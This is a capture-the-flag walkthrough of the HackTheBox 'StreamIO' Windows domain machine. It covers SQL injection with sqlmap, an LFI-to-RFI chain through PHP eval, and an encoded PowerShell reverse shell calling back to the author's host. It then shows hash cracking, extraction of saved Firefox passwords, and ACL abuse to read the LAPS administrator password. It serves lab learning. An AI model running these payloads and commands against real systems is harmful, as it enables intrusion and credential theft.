---
layout: post
title: HackTheBox - StreamIO
category: HackTheBox
tags: machines windows ad mssql web laps
date: 2022-09-17 15:35 +0300
---

![Machine logo](/assets/hackthebox/streamio/StreamIO.png){:height="420px" width="620px"}

# Table of contents

- [Configuration](#configuration)
- [Reconnaissance](#reconnaissance)
  * [Port scan](#port-scan)
  * [Web application](#web-application)
- [user.txt](#usertxt)
  * [Let sqlmap get the login page](#let-sqlmap-get-the-login-page)
  * [Make LFI RCE again!](#make-lfi-rce-again-)
  * [Get all domain users](#get-all-domain-users)
  * [Dump the database backup](#dump-the-database-backup)
- [root.txt](#roottxt)
  * [Get passwords from browser](#get-passwords-from-browser)
  * [Let ourselves ReadLAPSPassword](#let-ourselves-readlapspassword)
- [Conclusion](#conclusion)

# Configuration

If you're using your own machine like me, you have to access HTB network via `OpenVPN`:

```bash
sudo openvpn lab_access_file.ovpn
```

You have to be accurate here, you must understand that your machine is becoming accessable for other users in the VPN network. So you have to protect yourself by setting up a strong password and turning off unused services on your machine. Make sure you have a strong system and others can't harm you.

It is very useful to append `/etc/hosts/` with ip address of the machine. It is useful to get subdomains and to not memorize the address every time.

```bash
echo "10.10.11.158  streamio.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

## Port scan

We start with a port scan. I've decided to remove the masscan because of its problems with infinity wait after the work is done. So the script is changed and now executes only nmap. 

```zsh
#!/bin/bash

if [[ $# != 1 ]]
then
    echo -e "\e[0;31m[!]\e[0m Not specified a host or incorrect use."
    exit 1
fi

ports=$(nmap -p- --min-rate=500 $1 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A $1
```

```bash
$ fnmap streamio.htb
$ cat nmap_scan
Nmap scan report for streamio.htb (10.10.11.158)
Host is up (0.29s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-09-13 20:25:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2022-09-13T20:26:47+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49933/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-09-13T20:26:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

It is an `Active Directory` domain. So the machine is Windows Server. It also has a web services on port 80/443. Let's start by enumerating the web service.

## Web application

On port 80 we can just see a Microsoft IIS default page. I think it is not interesting for us. Let's move on `HTTPS` port 443.

![Web application](/assets/hackthebox/streamio/web_application.png)

We can see some pages here, but the most interesting for us is `login` page. But let's enumerate the directories of the web app. I've used a `ffuf` tool here.

```bash
export URL='https://streamio.htb/FUZZ'
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u $URL -fc 404
```

![Interesting admin page](/assets/hackthebox/streamio/found_admin_page.png)

We can see an interesting `/admin/` page here. But we are not allowed to access it. So we need an authentication. To use cURL here we need to specify a `-k` flag, which allows us to ingnore self-signed encryption certificate.

```bash
curl -k https://streamio.htb/admin/
```

![Admin page is forbidden](/assets/hackthebox/streamio/admin_page_forbidden.png)

# user.txt

## Let sqlmap get the login page

On login page it is hard to do something manually, so I've decided to pass it into `SQLMAP` tool. And it did find the injection, but it was `TIME-BASED` Microsoft SQL server injection. It was so boring to wait for the results, and you have to be lucky to dump the credentials you really need.

![Login page](/assets/hackthebox/streamio/login_page.png)

```bash
sqlmap -u 'https://streamio.htb/login.php' --data='username=test&password=test' --batch --dbms='Microsoft SQL Server' --tables
```

![SQLMAP found injection](/assets/hackthebox/streamio/sqlmap_injection.png)

![Found database](/assets/hackthebox/streamio/STREAMIO_db.png)

The database here is `STREAMIO`. It has 2 tables, `movies` and `users`. I think movies are not interesting for us.

```bash
sqlmap -u 'https://streamio.htb/login.php' --data='username=test&password=test' --batch --dbms='Microsoft SQL Server' -D 'STREAMIO' --tables
```

![Database tables](/assets/hackthebox/streamio/db_tables.png)

So, I've started enumerating users, and there was the big hole. I've spent so much time to get right user. FInally, I've found `yoshihide` user with its password hash.

```bash
sqlmap -u 'https://streamio.htb/login.php' --data='username=test&password=test' --batch --dbms='Microsoft SQL Server' -D 'STREAMIO' -T 'users' --dump
```

The hash was `MD5` type, I've found that with `haiti` tool. I did brute-force it with `JohnTheRipper` and got a valid credentials to log in. 

![yoshihide hash](/assets/hackthebox/streamio/yoshihide_hash.png)

When I logged in, I just moved to /admin/ page to see what is next. There was an `Admin panel` with some management functions.

## Make LFI RCE again!

![Admin panel](/assets/hackthebox/streamio/admin_panel.png)

These functions did work by parameters in `GET` request. And they just allows us to retrive some information about database. So the next step is to find some functions by bruteforcing the parameter. I've used `ffuf` and specified my cookie value with `-H` flag.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H 'Cookie: PHPSESSID=o58kjrdjkb7glq5na58mikne95' -u $URL -fw 85
```

![Brute-force the parameter](/assets/hackthebox/streamio/brute_parameter.png)

We got a secret parameter `debug` here. And I've decided to check if it's vulnerable to `Local File Inclusion` (LFI) attack. We've noted that it is a Windows Server, so the path to hosts file would be like "C:Windows\System32\Drivers\etc\hosts". I've specified it and got an LFI.

![LFI discovery](/assets/hackthebox/streamio/lfi_discovery.png)

The web application is working on `PHP`. So in case with LFI we can use a `PHP Filters` to read the sources of PHP files. We do encode them with `Base64` and decode on our local machine. Let's read the `index.php` file. It is better to do with `cURL` because it allows us to read contents more comfortable.

```bash
curl -k -X GET -b 'PHPSESSID=o58kjrdjkb7glq5na58mikne95' 'https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=index.php'
```

Here we can find 2 interesting things. The database credentials and the logic of the debug function. We note the credentials to next steps. A debug logic is just to `include` the specified file. I don't think movies or users php files are interesting for us, so our next step is to fuzz the filename.

![Database credentials](/assets/hackthebox/streamio/db_credentials.png)

![Debug function](/assets/hackthebox/streamio/debug_function.png)

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -H 'Cookie: PHPSESSID=o58kjrdjkb7glq5na58mikne95' -u $URL -fw 90
```

![Got master.php](/assets/hackthebox/streamio/got_master_php.png)

Here is an interesting file. Let's read it by using PHP Filter. Now we can see that the file is using `eval` function on the result of `file_get_contents` function. The second one is taking a path to file from `POST` request data parameter `include`. 

![include in master.php](/assets/hackthebox/streamio/include.png)

And there is a path to get a reverse shell, because file_get_contents funciton allows remote includes. We just have to specify the debug parameter with master.php and send a POST request with include parameter with our address with the payload. So, we have to set up a HTTP server, listener and prepare our payload.

We can take a payload on [revshells](https://www.revshells.com/). I've used a powershell #3 here.

```PHP
echo system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=');
```

```bash
sudo python3 -m http.server 80  # With sudo because port 80
nc -lnvp 4444
curl -k -X POST -b 'PHPSESSID=o58kjrdjkb7glq5na58mikne95' -d 'include=http%3A%2F%2F10.10.16.2%2Fpayload' https://streamio.htb/admin/?debug=master.php
```

![Got a reverse shell](/assets/hackthebox/streamio/yoshihide_rev_shell.png)

We're in!

## Get all domain users

When we get in the domain, it is useful to enumerate and note some information about its users, computers, etc... To do that in our powershell session we have to import `ActiveDirectory` module. To enumerate all users we can use `Get-ADUser` cmdlet.

```powershell
Import-Module ActiveDirectory
Get-ADUser -Filter *
```

And it is useful to note the users list to us.

![Users list](/assets/hackthebox/streamio/user_list.png)

## Dump the database backup

At first I wanted to make a port-forwarding and dump the whole database with sqlmap, but I did not found the way to start sqlmap on streamio backup, the tool is just not accepting the "@" symbol in the password, even with backslashes and single-quotation. So I've decided to use a [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL). It is a powershell tool to enumerate SQL servers in the AD domain.

Let's start our enumeration with the SQL server info. Our scope here is databases. PowerUpSQL is providing us with localhost_Databases.csv file, which we can analyze.

```powershell
Invoke-SQLDumpInfo -Verbose -Instance localhost -Username db_admin -Password '-- EDITED --'
```

![SQL server info](/assets/hackthebox/streamio/dumped_sql.png)

![Found streamio_backup](/assets/hackthebox/streamio/found_streamio_backup.png)

Then, we can dump the database by `quering` a SQL server. The tables are similar as in STREAMIO database, so we dump the users table.

```powershell
Get-SQLQuery -Instance localhost -Username db_admin -Password '-- EDITED --' -Query 'select TOP 10 * from streamio_backup.dbo.users'
```

![Users backup](/assets/hackthebox/streamio/users_backup.png)

We got backuped MD5 hashes. We can query the DC and verify that nikk37 exists in the domain. So it is probably our target here. Let's crack the hash with john.

```bash
echo '-- EDITED --' > nikk37_hash
john --wordlist=~/tools/rockyou.txt --format=raw-md5 nikk37_hash
```

![nikk37 cracked hash](/assets/hackthebox/streamio/nikk37_password.png)

The hash is cracked and now we can try to log in with winrm. Luckly for us, it worked!

```
evil-winrm -i 10.10.11.158 -u nikk37 -p '-- EDITED --'
```

![Got user](/assets/hackthebox/streamio/got_user.png)

# root.txt

With a privilege escalation in Active Directory domain the `Access Control Entities` (ACEs) and `Access Control Lists` (ACLs) are always there. The most powerful tool to enumerate them is `BloodHound`. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. We have to grab the data about domain and upload it in the BloodHound. To grab the data I've uploaded `SharpHound.exe`, which is provided with BloodHound. It results an archive, we have to download it and upload in BloodHound GUI.

```powershell
upload SharpHound.exe
./SharpHound.exe -CollectionMethods All
download 20220916142509_BloodHound.zip
```

![nikk37 groups](/assets/hackthebox/streamio/nikk37_groups.png)

## Get passwords from browser

There is only 1 machine account in the domain, the DC. And we are in but with low privileges. In BloodHound I've found that user nikk37 can only PSRemote to DC and nothing interesting else. So, after spending some time to find something manually I decided to upload [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

After processing winPEAS output we can find a `Firefox` database. 

![winPEAS found Firefox database](/assets/hackthebox/streamio/firefox_db.png)

The password there are encrypted. But we can crack them! To do that, we have to download the `db` file and the `logins` file associated with that db on our local machine. It is easy to do with evil-winrm. There is a tool to crack Firefox browser encryption, [firepwd](https://github.com/lclevy/firepwd). We just need to pass the directory with our files to it and wait the output.

On evil-winrm session:

```powershell
download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db /home/kali/Documents/StreamIO/key4.db
download C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json /home/kali/Documents/StreamIO/logins.json
```

On local machine:

```bash
mkdir mozilla_db/
mv key4.db mozilla_db/
mv logins.json mozilla_db
python firepwd.py -d mozilla_db
```

![Cracked Firefox database](/assets/hackthebox/streamio/cracked_firefox.png)

And there it is. We got several passwords. The user admin does not exist in the domain and we got credentials for nikk37. yoshihide was the first owned user, so I've decided that it is not him. The last one to check was `JDgodd` user. I used `CrackMapExec` here to brute-force the password. And I had to create a password list file to pass it in cme.

![Possible passwords](/assets/hackthebox/streamio/possible_passwords.png)

![Brute-force password with cme](/assets/hackthebox/streamio/cme_check_password.png)

And we got it. Now we can perform actions as `JDgodd` user. But the user does not have the `CanPSRemote` permisson on the computer, this is why we are continuing do actions in nikk37 evil-winrm sessions.

## Let ourselves ReadLAPSPassword

As we got a new owned user, we can check its abilities and permissions in the domain. In BloodHound we can note that JDgodd user have `WriteOwner` permission on `Core Staff` Group. Next we can see that the group has a `ReadLAPSPassword` permission. The members of this group to read the password set by `Local Administrator Password Solution` (LAPS). And them can read the Local Administrator password on the Domain Controller, so if we read this, we can compromise the domain!

![ReadLAPSPassword path to root](/assets/hackthebox/streamio/path_to_root.png)

We need severals tools here to do this task. `PowerView` to work with ACLs and `LAPSDumper` to get the password. Our plan becomes simple:

0. Upload PowerView on the machine and download LAPSDumper
1. Set JDgodd user credentials to use them with powershell
2. Add permission to write members in "Core Staff" group
3. Add ourselves to that group members (JDgodd or nikk37)
4. Read the LAPS password on the DC

I've got several problems here. When I've setted a `WriteMembers` permisson directly, I had an Access Denied error. The solution was just to remove directly setting and let it to default "All" and then it worked. Also, I've tried to read LAPS password from "ms-mcs-AdmPwd" LDAP attribute, but there was no output. This is why I found LAPSDumper, it did it perfectly.

In evil-winrm session:

```powershell
download powerview.ps1
Import-Module ./powerview.ps1
$SecPassword = ConvertTo-SecureString '-- EDITED --' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('STREAMIO\JDgodd', $SecPassword)
Got access denied if added WriteMembers
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -principalidentity "streamio\JDgodd"
Add-DomainGroupMember -identity "Core Staff" -members "streamio\JDgodd" -credential $Cred
```

On our attacking machine:

```bash
wget https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py
python3 laps.py -u JDgodd -p '-- EDITED --' -d streamio.htb
```

![Root exploitaition](/assets/hackthebox/streamio/root_exploitation.png)

There it is! Now we can just connect via evil-winrm and get the root flag. The flag was not in the Administrators directory, so I used Cet-ChildItem cmdlet. You can find a nice guide to search files with gci [here](https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/).

![Got root](/assets/hackthebox/streamio/got_root.png)

The box is Pwn3d!

![Pwn3d!](/assets/hackthebox/streamio/pwn3d.png){:height="420px" width="620px"}

# Conclusion

That was the hardest box I've ever done. The starting enumeration was the hardest part of this box, I spent a lot of time on that. I think I could just enumerate the `streamio_db` database with SQLMAP without a reverse shell from the web, but it is okay 😂. But it was very interesting and it is so cool to learn about Windows and AD privilege escalation/lateral movement. I've really enjoyed the box!

Thank you for reading, I hope it was useful for you ❤️
